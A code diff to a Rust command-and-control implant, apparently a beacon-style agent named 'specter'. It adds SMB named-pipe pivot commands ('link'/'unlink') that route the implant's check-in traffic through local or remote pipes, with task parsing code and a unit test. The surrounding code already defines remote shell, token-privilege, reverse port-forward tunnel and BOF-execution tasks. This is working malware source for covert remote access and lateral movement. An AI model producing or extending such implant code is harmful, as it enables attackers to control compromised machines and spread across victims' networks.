@@ -164,6 +164,12 @@ pub const COMMAND_TOKEN_PRIVS: u32 = 59;
 /// terminal drives Start/Write, close rides `jobs kill`).
 pub const COMMAND_SHELL_START: u32 = 71;
 pub const COMMAND_SHELL_WRITE: u32 = 72;
+/// SMB named-pipe pivot (free ids in the native numbering, like the shell
+/// pair 71/72): `link` connects the check-in transport to a named pipe
+/// (local or remote over SMB), `unlink` closes it and returns to the
+/// direct HTTP transport.
+pub const COMMAND_LINK: u32 = 73;
+pub const COMMAND_UNLINK: u32 = 74;
 /// Tunnels (native beacon_agent numbering; UDP — 63/65 — is not
 /// implemented, like the original specter's tunnel.c which is
 /// TCP-only). Tasks arrive through TunnelCallbacks (PROXY_DATA), the
@@ -353,6 +359,10 @@ pub enum Task {
     /// `COMMAND_TUNNEL_REVERSE` (rportfwd) with the tunnel id and the
     /// listen port.
     TunnelReverse { tunnel_id: u32, port: u32 },
+    /// `COMMAND_LINK` with the named-pipe path (ACP bytes).
+    Link { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_UNLINK`: close the pivot pipe.
+    Unlink,
 }
 
 impl Task {
@@ -366,7 +376,8 @@ impl Task {
             | Task::Mkdir { path_len, path }
             | Task::Rm { path_len, path }
             | Task::Download { path_len, path }
-            | Task::Upload { path_len, path, .. } => &path[..*path_len as usize],
+            | Task::Upload { path_len, path, .. }
+            | Task::Link { path_len, path } => &path[..*path_len as usize],
             Task::Cp { src_len, src, .. } | Task::Mv { src_len, src, .. } => {
                 &src[..*src_len as usize]
             }
@@ -633,6 +644,11 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let port = r.u32_le()?;
             Task::TunnelReverse { tunnel_id, port }
         }
+        COMMAND_LINK => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Link { path_len, path }
+        }
+        COMMAND_UNLINK => Task::Unlink,
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -1800,6 +1816,11 @@ mod tests {
         w.u32_le(4);
         w.push(b"data");
         w.u32_le(11);
+        w.u32_le(COMMAND_LINK);
+        ps(&mut w, b"\\\\.\\pipe\\specter");
+        w.u32_le(13);
+        w.u32_le(COMMAND_UNLINK);
+        w.u32_le(14);
         w.u32_le(COMMAND_EXEC_BOF);
         w.u8(0);
         ps(&mut w, b"go");
@@ -1809,6 +1830,31 @@ mod tests {
         w.push(b"\x01\x02");
         w.u32_le(12);
         w.written_bytes().to_vec()
+    }
+
+    #[test]
+    fn parse_task_link_unlink() {
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        w.u32_le(COMMAND_LINK);
+        let path: &[u8] = b"\\\\.\\pipe\\specter"; // \\.\pipe\specter, 16 bytes
+        w.u32_le((path.len() + 1) as u32);
+        w.push(path);
+        w.u8(0);
+        w.u32_le(9);
+        let bytes = w.written_bytes().to_vec();
+        let mut r = Reader::new(&bytes);
+        let (task, id) = parse_task(&mut r).expect("link parses");
+        assert!(matches!(task, Task::Link { path_len: 16, .. }));
+        assert_eq!(task.path(), path);
+        assert_eq!(id, 9);
+        assert_eq!(r.remaining(), 0);
+
+        let bytes = [74u8, 0, 0, 0, 3, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::Unlink, 3))
+        );
     }
 
     /// Deterministic hostile-pack fuzz: mutate a valid pack (truncation,
